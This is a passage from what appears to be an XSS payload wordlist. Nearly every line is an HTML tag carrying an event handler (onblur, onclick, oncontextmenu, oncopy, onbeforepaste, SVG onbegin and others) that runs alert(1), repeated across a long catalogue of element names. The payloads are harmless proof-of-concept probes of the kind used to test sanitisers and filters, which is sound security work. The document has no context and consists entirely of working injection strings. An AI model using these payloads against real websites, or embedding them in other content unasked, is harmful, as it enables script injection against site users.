<strong onbeforepaste="alert(1)" contenteditable>test</strong>
<style onbeforepaste="alert(1)" contenteditable>test</style>
<sub onbeforepaste="alert(1)" contenteditable>test</sub>
<summary onbeforepaste="alert(1)" contenteditable>test</summary>
<sup onbeforepaste="alert(1)" contenteditable>test</sup>
<svg onbeforepaste="alert(1)" contenteditable>test</svg>
<table onbeforepaste="alert(1)" contenteditable>test</table>
<tbody onbeforepaste="alert(1)" contenteditable>test</tbody>
<td onbeforepaste="alert(1)" contenteditable>test</td>
<template onbeforepaste="alert(1)" contenteditable>test</template>
<tfoot onbeforepaste="alert(1)" contenteditable>test</tfoot>
<th onbeforepaste="alert(1)" contenteditable>test</th>
<thead onbeforepaste="alert(1)" contenteditable>test</thead>
<time onbeforepaste="alert(1)" contenteditable>test</time>
<title onbeforepaste="alert(1)" contenteditable>test</title>
<tr onbeforepaste="alert(1)" contenteditable>test</tr>
<track onbeforepaste="alert(1)" contenteditable>test</track>
<tt onbeforepaste="alert(1)" contenteditable>test</tt>
<u onbeforepaste="alert(1)" contenteditable>test</u>
<ul onbeforepaste="alert(1)" contenteditable>test</ul>
<var onbeforepaste="alert(1)" contenteditable>test</var>
<video onbeforepaste="alert(1)" contenteditable>test</video>
<wbr onbeforepaste="alert(1)" contenteditable>test</wbr>
<xmp onbeforepaste="alert(1)" contenteditable>test</xmp>
<body onbeforeprint=alert(1)>
<body onbeforeunload=\"location='javascript:alert(1)'\">
<svg><discard onbegin=alert(1)>
<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
<svg><animatetransform onbegin=alert(1) attributeName=transform>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<input onblur=alert(1) id=x><input autofocus>
<textarea onblur=alert(1) id=x></textarea><input autofocus>
<button onblur=alert(1) id=x></button><input autofocus>
<select onblur=alert(1) id=x></select><input autofocus>
<body onblur=alert(1) id=x><iframe id=x>
<iframe onblur=alert(1) id=x><input autofocus>
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>
<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>
<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>
<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>
<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>
<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>
<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>
<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>
<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>
<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>
<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>
<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>
<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>
<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>
<em onblur=alert(1) tabindex=1 id=x></em><input autofocus>
<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>
<fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>
<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>
<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>
<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>
<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>
<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>
<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>
<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>
<header onblur=alert(1) tabindex=1 id=x></header><input autofocus>
<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>
<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>
<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>
<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>
<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>
<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>
<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>
<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>
<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>
<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>
<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>
<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>
<listing onblur=alert(1) tabindex=1 id=x></listing><input autofocus>
<main onblur=alert(1) tabindex=1 id=x></main><input autofocus>
<map onblur=alert(1) tabindex=1 id=x></map><input autofocus>
<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>
<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>
<menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>
<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>
<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>
<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>
<nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>
<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>
<nobr onblur=alert(1) tabindex=1 id=x></nobr><input autofocus>
<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>
<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>
<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>
<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>
<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>
<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>
<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>
<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>
<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>
<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>
<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>
<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>
<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>
<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>
<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>
<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>
<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>
<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>
<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>
<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>
<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>
<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
<video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<input onchange=alert(1) value=xss>
<textarea onchange=alert(1)>XSS</textarea>
<select onchange=alert(1)><option>change me</option><option>XSS</option></select>
<a onclick="alert(1)">test</a>
<abbr onclick="alert(1)">test</abbr>
<acronym onclick="alert(1)">test</acronym>
<address onclick="alert(1)">test</address>
<applet onclick="alert(1)">test</applet>
<area onclick="alert(1)">test</area>
<article onclick="alert(1)">test</article>
<aside onclick="alert(1)">test</aside>
<audio onclick="alert(1)">test</audio>
<b onclick="alert(1)">test</b>
<base onclick="alert(1)">test</base>
<basefont onclick="alert(1)">test</basefont>
<bdi onclick="alert(1)">test</bdi>
<bdo onclick="alert(1)">test</bdo>
<bgsound onclick="alert(1)">test</bgsound>
<big onclick="alert(1)">test</big>
<blink onclick="alert(1)">test</blink>
<blockquote onclick="alert(1)">test</blockquote>
<body onclick="alert(1)">test</body>
<br onclick="alert(1)">test</br>
<button onclick="alert(1)">test</button>
<canvas onclick="alert(1)">test</canvas>
<caption onclick="alert(1)">test</caption>
<center onclick="alert(1)">test</center>
<cite onclick="alert(1)">test</cite>
<code onclick="alert(1)">test</code>
<col onclick="alert(1)">test</col>
<colgroup onclick="alert(1)">test</colgroup>
<command onclick="alert(1)">test</command>
<content onclick="alert(1)">test</content>
<data onclick="alert(1)">test</data>
<datalist onclick="alert(1)">test</datalist>
<dd onclick="alert(1)">test</dd>
<del onclick="alert(1)">test</del>
<details onclick="alert(1)">test</details>
<dfn onclick="alert(1)">test</dfn>
<dialog onclick="alert(1)">test</dialog>
<dir onclick="alert(1)">test</dir>
<div onclick="alert(1)">test</div>
<dl onclick="alert(1)">test</dl>
<dt onclick="alert(1)">test</dt>
<element onclick="alert(1)">test</element>
<em onclick="alert(1)">test</em>
<embed onclick="alert(1)">test</embed>
<fieldset onclick="alert(1)">test</fieldset>
<figcaption onclick="alert(1)">test</figcaption>
<figure onclick="alert(1)">test</figure>
<font onclick="alert(1)">test</font>
<footer onclick="alert(1)">test</footer>
<form onclick="alert(1)">test</form>
<frame onclick="alert(1)">test</frame>
<frameset onclick="alert(1)">test</frameset>
<h1 onclick="alert(1)">test</h1>
<head onclick="alert(1)">test</head>
<header onclick="alert(1)">test</header>
<hgroup onclick="alert(1)">test</hgroup>
<hr onclick="alert(1)">test</hr>
<html onclick="alert(1)">test</html>
<i onclick="alert(1)">test</i>
<iframe onclick="alert(1)">test</iframe>
<image onclick="alert(1)">test</image>
<img onclick="alert(1)">test</img>
<input onclick="alert(1)">test</input>
<ins onclick="alert(1)">test</ins>
<isindex onclick="alert(1)">test</isindex>
<kbd onclick="alert(1)">test</kbd>
<keygen onclick="alert(1)">test</keygen>
<label onclick="alert(1)">test</label>
<legend onclick="alert(1)">test</legend>
<li onclick="alert(1)">test</li>
<link onclick="alert(1)">test</link>
<listing onclick="alert(1)">test</listing>
<main onclick="alert(1)">test</main>
<map onclick="alert(1)">test</map>
<mark onclick="alert(1)">test</mark>
<marquee onclick="alert(1)">test</marquee>
<menu onclick="alert(1)">test</menu>
<menuitem onclick="alert(1)">test</menuitem>
<meta onclick="alert(1)">test</meta>
<meter onclick="alert(1)">test</meter>
<multicol onclick="alert(1)">test</multicol>
<nav onclick="alert(1)">test</nav>
<nextid onclick="alert(1)">test</nextid>
<nobr onclick="alert(1)">test</nobr>
<noembed onclick="alert(1)">test</noembed>
<noframes onclick="alert(1)">test</noframes>
<noscript onclick="alert(1)">test</noscript>
<object onclick="alert(1)">test</object>
<ol onclick="alert(1)">test</ol>
<optgroup onclick="alert(1)">test</optgroup>
<option onclick="alert(1)">test</option>
<output onclick="alert(1)">test</output>
<p onclick="alert(1)">test</p>
<param onclick="alert(1)">test</param>
<picture onclick="alert(1)">test</picture>
<plaintext onclick="alert(1)">test</plaintext>
<pre onclick="alert(1)">test</pre>
<progress onclick="alert(1)">test</progress>
<q onclick="alert(1)">test</q>
<rb onclick="alert(1)">test</rb>
<rp onclick="alert(1)">test</rp>
<rt onclick="alert(1)">test</rt>
<rtc onclick="alert(1)">test</rtc>
<ruby onclick="alert(1)">test</ruby>
<s onclick="alert(1)">test</s>
<samp onclick="alert(1)">test</samp>
<script onclick="alert(1)">test</script>
<section onclick="alert(1)">test</section>
<select onclick="alert(1)">test</select>
<shadow onclick="alert(1)">test</shadow>
<slot onclick="alert(1)">test</slot>
<small onclick="alert(1)">test</small>
<source onclick="alert(1)">test</source>
<spacer onclick="alert(1)">test</spacer>
<span onclick="alert(1)">test</span>
<strike onclick="alert(1)">test</strike>
<strong onclick="alert(1)">test</strong>
<style onclick="alert(1)">test</style>
<sub onclick="alert(1)">test</sub>
<summary onclick="alert(1)">test</summary>
<sup onclick="alert(1)">test</sup>
<svg onclick="alert(1)">test</svg>
<table onclick="alert(1)">test</table>
<tbody onclick="alert(1)">test</tbody>
<td onclick="alert(1)">test</td>
<template onclick="alert(1)">test</template>
<textarea onclick="alert(1)">test</textarea>
<tfoot onclick="alert(1)">test</tfoot>
<th onclick="alert(1)">test</th>
<thead onclick="alert(1)">test</thead>
<time onclick="alert(1)">test</time>
<title onclick="alert(1)">test</title>
<tr onclick="alert(1)">test</tr>
<track onclick="alert(1)">test</track>
<tt onclick="alert(1)">test</tt>
<u onclick="alert(1)">test</u>
<ul onclick="alert(1)">test</ul>
<var onclick="alert(1)">test</var>
<video onclick="alert(1)">test</video>
<wbr onclick="alert(1)">test</wbr>
<xmp onclick="alert(1)">test</xmp>
<a oncontextmenu="alert(1)">test</a>
<abbr oncontextmenu="alert(1)">test</abbr>
<acronym oncontextmenu="alert(1)">test</acronym>
<address oncontextmenu="alert(1)">test</address>
<applet oncontextmenu="alert(1)">test</applet>
<area oncontextmenu="alert(1)">test</area>
<article oncontextmenu="alert(1)">test</article>
<aside oncontextmenu="alert(1)">test</aside>
<audio oncontextmenu="alert(1)">test</audio>
<b oncontextmenu="alert(1)">test</b>
<base oncontextmenu="alert(1)">test</base>
<basefont oncontextmenu="alert(1)">test</basefont>
<bdi oncontextmenu="alert(1)">test</bdi>
<bdo oncontextmenu="alert(1)">test</bdo>
<bgsound oncontextmenu="alert(1)">test</bgsound>
<big oncontextmenu="alert(1)">test</big>
<blink oncontextmenu="alert(1)">test</blink>
<blockquote oncontextmenu="alert(1)">test</blockquote>
<body oncontextmenu="alert(1)">test</body>
<br oncontextmenu="alert(1)">test</br>
<button oncontextmenu="alert(1)">test</button>
<canvas oncontextmenu="alert(1)">test</canvas>
<caption oncontextmenu="alert(1)">test</caption>
<center oncontextmenu="alert(1)">test</center>
<cite oncontextmenu="alert(1)">test</cite>
<code oncontextmenu="alert(1)">test</code>
<col oncontextmenu="alert(1)">test</col>
<colgroup oncontextmenu="alert(1)">test</colgroup>
<command oncontextmenu="alert(1)">test</command>
<content oncontextmenu="alert(1)">test</content>
<data oncontextmenu="alert(1)">test</data>
<datalist oncontextmenu="alert(1)">test</datalist>
<dd oncontextmenu="alert(1)">test</dd>
<del oncontextmenu="alert(1)">test</del>
<details oncontextmenu="alert(1)">test</details>
<dfn oncontextmenu="alert(1)">test</dfn>
<dialog oncontextmenu="alert(1)">test</dialog>
<dir oncontextmenu="alert(1)">test</dir>
<div oncontextmenu="alert(1)">test</div>
<dl oncontextmenu="alert(1)">test</dl>
<dt oncontextmenu="alert(1)">test</dt>
<element oncontextmenu="alert(1)">test</element>
<em oncontextmenu="alert(1)">test</em>
<embed oncontextmenu="alert(1)">test</embed>
<fieldset oncontextmenu="alert(1)">test</fieldset>
<figcaption oncontextmenu="alert(1)">test</figcaption>
<figure oncontextmenu="alert(1)">test</figure>
<font oncontextmenu="alert(1)">test</font>
<footer oncontextmenu="alert(1)">test</footer>
<form oncontextmenu="alert(1)">test</form>
<frame oncontextmenu="alert(1)">test</frame>
<frameset oncontextmenu="alert(1)">test</frameset>
<h1 oncontextmenu="alert(1)">test</h1>
<head oncontextmenu="alert(1)">test</head>
<header oncontextmenu="alert(1)">test</header>
<hgroup oncontextmenu="alert(1)">test</hgroup>
<hr oncontextmenu="alert(1)">test</hr>
<html oncontextmenu="alert(1)">test</html>
<i oncontextmenu="alert(1)">test</i>
<iframe oncontextmenu="alert(1)">test</iframe>
<image oncontextmenu="alert(1)">test</image>
<img oncontextmenu="alert(1)">test</img>
<input oncontextmenu="alert(1)">test</input>
<ins oncontextmenu="alert(1)">test</ins>
<isindex oncontextmenu="alert(1)">test</isindex>
<kbd oncontextmenu="alert(1)">test</kbd>
<keygen oncontextmenu="alert(1)">test</keygen>
<label oncontextmenu="alert(1)">test</label>
<legend oncontextmenu="alert(1)">test</legend>
<li oncontextmenu="alert(1)">test</li>
<link oncontextmenu="alert(1)">test</link>
<listing oncontextmenu="alert(1)">test</listing>
<main oncontextmenu="alert(1)">test</main>
<map oncontextmenu="alert(1)">test</map>
<mark oncontextmenu="alert(1)">test</mark>
<marquee oncontextmenu="alert(1)">test</marquee>
<menu oncontextmenu="alert(1)">test</menu>
<menuitem oncontextmenu="alert(1)">test</menuitem>
<meta oncontextmenu="alert(1)">test</meta>
<meter oncontextmenu="alert(1)">test</meter>
<multicol oncontextmenu="alert(1)">test</multicol>
<nav oncontextmenu="alert(1)">test</nav>
<nextid oncontextmenu="alert(1)">test</nextid>
<nobr oncontextmenu="alert(1)">test</nobr>
<noembed oncontextmenu="alert(1)">test</noembed>
<noframes oncontextmenu="alert(1)">test</noframes>
<noscript oncontextmenu="alert(1)">test</noscript>
<object oncontextmenu="alert(1)">test</object>
<ol oncontextmenu="alert(1)">test</ol>
<optgroup oncontextmenu="alert(1)">test</optgroup>
<option oncontextmenu="alert(1)">test</option>
<output oncontextmenu="alert(1)">test</output>
<p oncontextmenu="alert(1)">test</p>
<param oncontextmenu="alert(1)">test</param>
<picture oncontextmenu="alert(1)">test</picture>
<plaintext oncontextmenu="alert(1)">test</plaintext>
<pre oncontextmenu="alert(1)">test</pre>
<progress oncontextmenu="alert(1)">test</progress>
<q oncontextmenu="alert(1)">test</q>
<rb oncontextmenu="alert(1)">test</rb>
<rp oncontextmenu="alert(1)">test</rp>
<rt oncontextmenu="alert(1)">test</rt>
<rtc oncontextmenu="alert(1)">test</rtc>
<ruby oncontextmenu="alert(1)">test</ruby>
<s oncontextmenu="alert(1)">test</s>
<samp oncontextmenu="alert(1)">test</samp>
<script oncontextmenu="alert(1)">test</script>
<section oncontextmenu="alert(1)">test</section>
<select oncontextmenu="alert(1)">test</select>
<shadow oncontextmenu="alert(1)">test</shadow>
<slot oncontextmenu="alert(1)">test</slot>
<small oncontextmenu="alert(1)">test</small>
<source oncontextmenu="alert(1)">test</source>
<spacer oncontextmenu="alert(1)">test</spacer>
<span oncontextmenu="alert(1)">test</span>
<strike oncontextmenu="alert(1)">test</strike>
<strong oncontextmenu="alert(1)">test</strong>
<style oncontextmenu="alert(1)">test</style>
<sub oncontextmenu="alert(1)">test</sub>
<summary oncontextmenu="alert(1)">test</summary>
<sup oncontextmenu="alert(1)">test</sup>
<svg oncontextmenu="alert(1)">test</svg>
<table oncontextmenu="alert(1)">test</table>
<tbody oncontextmenu="alert(1)">test</tbody>
<td oncontextmenu="alert(1)">test</td>
<template oncontextmenu="alert(1)">test</template>
<textarea oncontextmenu="alert(1)">test</textarea>
<tfoot oncontextmenu="alert(1)">test</tfoot>
<th oncontextmenu="alert(1)">test</th>
<thead oncontextmenu="alert(1)">test</thead>
<time oncontextmenu="alert(1)">test</time>
<title oncontextmenu="alert(1)">test</title>
<tr oncontextmenu="alert(1)">test</tr>
<track oncontextmenu="alert(1)">test</track>
<tt oncontextmenu="alert(1)">test</tt>
<u oncontextmenu="alert(1)">test</u>
<ul oncontextmenu="alert(1)">test</ul>
<var oncontextmenu="alert(1)">test</var>
<video oncontextmenu="alert(1)">test</video>
<wbr oncontextmenu="alert(1)">test</wbr>
<xmp oncontextmenu="alert(1)">test</xmp>
<input oncopy=alert(1) value="XSS" autofocus>
<textarea oncopy=alert(1) autofocus>XSS</textarea>
<a oncopy="alert(1)" contenteditable>test</a>
<abbr oncopy="alert(1)" contenteditable>test</abbr>
<acronym oncopy="alert(1)" contenteditable>test</acronym>
<address oncopy="alert(1)" contenteditable>test</address>
<applet oncopy="alert(1)" contenteditable>test</applet>
<area oncopy="alert(1)" contenteditable>test</area>
<article oncopy="alert(1)" contenteditable>test</article>
<aside oncopy="alert(1)" contenteditable>test</aside>
<audio oncopy="alert(1)" contenteditable>test</audio>
<b oncopy="alert(1)" contenteditable>test</b>
<base oncopy="alert(1)" contenteditable>test</base>
<basefont oncopy="alert(1)" contenteditable>test</basefont>
<bdi oncopy="alert(1)" contenteditable>test</bdi>
<bdo oncopy="alert(1)" contenteditable>test</bdo>
<bgsound oncopy="alert(1)" contenteditable>test</bgsound>
<big oncopy="alert(1)" contenteditable>test</big>
<blink oncopy="alert(1)" contenteditable>test</blink>
<blockquote oncopy="alert(1)" contenteditable>test</blockquote>
<body oncopy="alert(1)" contenteditable>test</body>
<br oncopy="alert(1)" contenteditable>test</br>
<button oncopy="alert(1)" contenteditable>test</button>
<canvas oncopy="alert(1)" contenteditable>test</canvas>
<caption oncopy="alert(1)" contenteditable>test</caption>
<center oncopy="alert(1)" contenteditable>test</center>
<cite oncopy="alert(1)" contenteditable>test</cite>
<code oncopy="alert(1)" contenteditable>test</code>
<col oncopy="alert(1)" contenteditable>test</col>
<colgroup oncopy="alert(1)" contenteditable>test</colgroup>
<command oncopy="alert(1)" contenteditable>test</command>
<content oncopy="alert(1)" contenteditable>test</content>
<data oncopy="alert(1)" contenteditable>test</data>
<datalist oncopy="alert(1)" contenteditable>test</datalist>
<dd oncopy="alert(1)" contenteditable>test</dd>
<del oncopy="alert(1)" contenteditable>test</del>
<details oncopy="alert(1)" contenteditable>test</details>
<dfn oncopy="alert(1)" contenteditable>test</dfn>
<dialog oncopy="alert(1)" contenteditable>test</dialog>
<dir oncopy="alert(1)" contenteditable>test</dir>
<div oncopy="alert(1)" contenteditable>test</div>
<dl oncopy="alert(1)" contenteditable>test</dl>
<dt oncopy="alert(1)" contenteditable>test</dt>
<element oncopy="alert(1)" contenteditable>test</element>
<em oncopy="alert(1)" contenteditable>test</em>
<embed oncopy="alert(1)" contenteditable>test</embed>
<fieldset oncopy="alert(1)" contenteditable>test</fieldset>
<figcaption oncopy="alert(1)" contenteditable>test</figcaption>
<figure oncopy="alert(1)" contenteditable>test</figure>
<font oncopy="alert(1)" contenteditable>test</font>
<footer oncopy="alert(1)" contenteditable>test</footer>
<form oncopy="alert(1)" contenteditable>test</form>
<frame oncopy="alert(1)" contenteditable>test</frame>
<frameset oncopy="alert(1)" contenteditable>test</frameset>
<h1 oncopy="alert(1)" contenteditable>test</h1>
<head oncopy="alert(1)" contenteditable>test</head>
<header oncopy="alert(1)" contenteditable>test</header>
<hgroup oncopy="alert(1)" contenteditable>test</hgroup>
<hr oncopy="alert(1)" contenteditable>test</hr>
<html oncopy="alert(1)" contenteditable>test</html>
<i oncopy="alert(1)" contenteditable>test</i>
<iframe oncopy="alert(1)" contenteditable>test</iframe>
<image oncopy="alert(1)" contenteditable>test</image>
<img oncopy="alert(1)" contenteditable>test</img>
<ins oncopy="alert(1)" contenteditable>test</ins>
<isindex oncopy="alert(1)" contenteditable>test</isindex>
<kbd oncopy="alert(1)" contenteditable>test</kbd>
<keygen oncopy="alert(1)" contenteditable>test</keygen>
<label oncopy="alert(1)" contenteditable>test</label>
<legend oncopy="alert(1)" contenteditable>test</legend>
<li oncopy="alert(1)" contenteditable>test</li>
<link oncopy="alert(1)" contenteditable>test</link>
<listing oncopy="alert(1)" contenteditable>test</listing>
<main oncopy="alert(1)" contenteditable>test</main>
<map oncopy="alert(1)" contenteditable>test</map>
<mark oncopy="alert(1)" contenteditable>test</mark>
<marquee oncopy="alert(1)" contenteditable>test</marquee>
<menu oncopy="alert(1)" contenteditable>test</menu>
<menuitem oncopy="alert(1)" contenteditable>test</menuitem>
<meta oncopy="alert(1)" contenteditable>test</meta>
<meter oncopy="alert(1)" contenteditable>test</meter>
<multicol oncopy="alert(1)" contenteditable>test</multicol>
<nav oncopy="alert(1)" contenteditable>test</nav>
<nextid oncopy="alert(1)" contenteditable>test</nextid>
<nobr oncopy="alert(1)" contenteditable>test</nobr>
<noembed oncopy="alert(1)" contenteditable>test</noembed>
<noframes oncopy="alert(1)" contenteditable>test</noframes>
<noscript oncopy="alert(1)" contenteditable>test</noscript>
<object oncopy="alert(1)" contenteditable>test</object>
<ol oncopy="alert(1)" contenteditable>test</ol>
<optgroup oncopy="alert(1)" contenteditable>test</optgroup>
<option oncopy="alert(1)" contenteditable>test</option>
<output oncopy="alert(1)" contenteditable>test</output>
<p oncopy="alert(1)" contenteditable>test</p>
<param oncopy="alert(1)" contenteditable>test</param>
<picture oncopy="alert(1)" contenteditable>test</picture>
<plaintext oncopy="alert(1)" contenteditable>test</plaintext>
<pre oncopy="alert(1)" contenteditable>test</pre>
<progress oncopy="alert(1)" contenteditable>test</progress>
<q oncopy="alert(1)" contenteditable>test</q>
<rb oncopy="alert(1)" contenteditable>test</rb>
<rp oncopy="alert(1)" contenteditable>test</rp>
<rt oncopy="alert(1)" contenteditable>test</rt>
<rtc oncopy="alert(1)" contenteditable>test</rtc>
<ruby oncopy="alert(1)" contenteditable>test</ruby>
<s oncopy="alert(1)" contenteditable>test</s>
<samp oncopy="alert(1)" contenteditable>test</samp>
<script oncopy="alert(1)" contenteditable>test</script>
<section oncopy="alert(1)" contenteditable>test</section>
<select oncopy="alert(1)" contenteditable>test</select>
<shadow oncopy="alert(1)" contenteditable>test</shadow>
<slot oncopy="alert(1)" contenteditable>test</slot>
<small oncopy="alert(1)" contenteditable>test</small>
<source oncopy="alert(1)" contenteditable>test</source>
<spacer oncopy="alert(1)" contenteditable>test</spacer>
<span oncopy="alert(1)" contenteditable>test</span>
<strike oncopy="alert(1)" contenteditable>test</strike>
<strong oncopy="alert(1)" contenteditable>test</strong>
<style oncopy="alert(1)" contenteditable>test</style>
<sub oncopy="alert(1)" contenteditable>test</sub>
<summary oncopy="alert(1)" contenteditable>test</summary>
<sup oncopy="alert(1)" contenteditable>test</sup>
<svg oncopy="alert(1)" contenteditable>test</svg>
<table oncopy="alert(1)" contenteditable>test</table>
<tbody oncopy="alert(1)" contenteditable>test</tbody>
<td oncopy="alert(1)" contenteditable>test</td>
<template oncopy="alert(1)" contenteditable>test</template>
<tfoot oncopy="alert(1)" contenteditable>test</tfoot>
<th oncopy="alert(1)" contenteditable>test</th>
<thead oncopy="alert(1)" contenteditable>test</thead>
<time oncopy="alert(1)" contenteditable>test</time>
